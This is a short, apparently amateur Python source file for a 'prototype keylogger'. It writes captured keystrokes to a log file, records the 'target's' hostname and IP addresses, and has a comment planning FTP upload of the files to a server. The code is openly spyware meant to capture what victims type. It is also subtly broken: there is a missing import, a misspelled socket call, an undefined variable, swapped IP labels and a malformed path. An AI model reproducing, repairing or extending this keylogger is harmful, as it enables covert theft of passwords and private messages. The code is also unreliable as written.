#prototype keylogger prints system info 
#to add: use ftp on client side to send the files to server

import socket
from requests import get

log = 'keylog.txt'
sys = 'sysinfo.txt'
path = "C:\Users\HP\Desktop\ACM"
add = '\\'

def sysinfo():
    with open(file + add + sys, "a") as file:
        name = socket.gethostname()
        #        
        pub_ip = socket.gethosybyname(name)
        priv_ip = get("https://api.ipify.org").text
        file.write("pub ip: " + pub_ip + "\n")
        file.write("targets name: " + name + "\n")
        file.write("priv ip: " + priv_ip + '\n')


flag = 0
key = ''

def tofile(key):
    with open(path + add + log, "a") as file:
        if key == keyboard.key.enter:
            file.write("\n")
            file.close()
        elif key == keyboard.key.space:
            file.write(' ')
            file.close()
        else:
            file.write(key)
            file.close()

with keyboard.listener(tofile = tofile) as listener:
    listener.join()
